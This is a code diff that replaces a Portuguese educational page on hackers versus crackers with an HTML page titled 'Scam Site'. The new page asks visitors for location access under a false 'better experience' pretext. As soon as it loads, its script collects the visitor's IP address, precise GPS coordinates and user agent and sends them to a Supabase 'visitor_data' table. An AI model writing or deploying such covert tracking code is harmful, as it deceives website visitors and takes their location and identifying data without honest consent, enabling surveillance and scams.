@@ -3,86 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Text Engine</title>
-    <style>
-        body {
-            margin: 0;
-            overflow: hidden;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            background-color: #000;
-        }
-
-        .text-container {
-            max-width: 98%;
-            padding: 30px;
-            border: 0px solid #00ff00;
-            box-sizing: border-box;
-            text-align: left;
-            overflow: hidden;
-        }
-
-        .text {
-            font-size: 24px;
-            font-family: 'Courier New', monospace;
-        }
-    </style>
+    <title>Scam Site</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
 </head>
 <body>
-    <div class="text-container" id="text-container">
-        <div class="text" id="text"></div>
-    </div>
+    <h1>Bem-vindo ao nosso site!</h1>
+    <p>Por favor, permita o acesso à sua localização para uma melhor experiência.</p>
 
     <script>
-        const textElement = document.getElementById('text');
-        const textContainer = document.getElementById('text-container');
-        const texts = [
-            { text: 'Diferença entre Hacker e Cracker:', duration: 3, speed: 50, color: '#00ff00' },
-            { text: 'Hacker e Cracker são termos frequentemente usados de forma intercambiável, mas têm significados distintos.', duration: 3, speed: 50, color: '#00ff00' },
-            { text: 'Hacker refere-se a um entusiasta da computação e da programação, geralmente com habilidades avançadas.', duration: 3, speed: 50, color: '#00ff00' },
-            { text: 'Hackers buscam entender profundamente sistemas computacionais, encontrar soluções criativas e explorar limites.', duration: 3, speed: 50, color: '#00ff00' },
-            { text: 'Por outro lado, Cracker é alguém que quebra sistemas, geralmente com intenções maliciosas.', duration: 3, speed: 50, color: '#00ff00' },
-            { text: 'Crackers buscam contornar medidas de segurança, explorar vulnerabilidades e realizar atividades ilegais.', duration: 3, speed: 50, color: '#00ff00' },
-            { text: 'Enquanto Hackers podem ser éticos e contribuir para a segurança, Crackers são muitas vezes associados a atividades ilegais.', duration: 3, speed: 50, color: '#00ff00' },
-            { text: 'Ambos têm habilidades técnicas significativas, mas a ética e a intenção diferenciam profundamente um do outro.', duration: 3, speed: 50, color: '#00ff00' },
-            { text: 'Em resumo, Hacker busca conhecimento e inovação, enquanto Cracker busca quebrar sistemas para ganhos pessoais.', duration: 3, speed: 50, color: '#00ff00' },
-            { text: 'Entender essa diferença é crucial na discussão sobre segurança digital e ética na computação. {fim}', duration: 3, speed: 50, color: '#00ff00' }
-            ];
+        // Configuração do Supabase
+        const SUPABASE_URL = 'https://your-supabase-url.supabase.co';
+        const SUPABASE_KEY = 'your-supabase-anon-key';
+        const supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-        let currentIndex = 0;
-
-        function typeText(currentTextObject) {
-            const { text, speed, color } = currentTextObject;
-            textElement.style.color = color;
-            textElement.innerHTML = ''; // Limpa o texto antes de começar a digitar
-            let i = 0;
-
-            function type() {
-                if (i < text.length) {
-                    textElement.innerHTML += text.charAt(i);
-                    i++;
-                    setTimeout(type, speed); // Ajuste a velocidade de escrita aqui (em milissegundos)
-                } else {
-                    nextText(); // Avança imediatamente para o próximo texto após a conclusão
-                }
+        // Função para obter o IP do visitante
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Erro ao obter IP:', error);
+                return null;
             }
-
-            type();
         }
 
-        function nextText() {
-            setTimeout(() => {
-                currentIndex = (currentIndex + 1) % texts.length;
-                if (currentIndex === 0) {
-                    textContainer.style.height = 'auto'; // Restaura a altura automática apenas no primeiro texto
+        // Função para obter a localização
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            resolve({
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude
+                            });
+                        },
+                        () => {
+                            resolve({ latitude: null, longitude: null });
+                        }
+                    );
+                } else {
+                    resolve({ latitude: null, longitude: null });
                 }
-                typeText(texts[currentIndex]);
-            }, texts[currentIndex].duration * 1000);
+            });
         }
 
-        typeText(texts[currentIndex]);
+        // Função principal para capturar e enviar dados
+        async function captureAndSendData() {
+            const ip = await getIP();
+            const location = await getLocation();
+            const userAgent = navigator.userAgent;
+
+            const data = {
+                ip: ip,
+                latitude: location.latitude,
+                longitude: location.longitude,
+                user_agent: userAgent
+            };
+
+            try {
+                const { error } = await supabase
+                    .from('visitor_data')
+                    .insert([data]);
+
+                if (error) {
+                    console.error('Erro ao enviar dados para o Supabase:', error);
+                } else {
+                    console.log('Dados enviados com sucesso!');
+                }
+            } catch (error) {
+                console.error('Erro ao enviar dados:', error);
+            }
+        }
+
+        // Executar a função quando a página carregar
+        window.onload = captureAndSendData;
     </script>
 </body>
 </html>
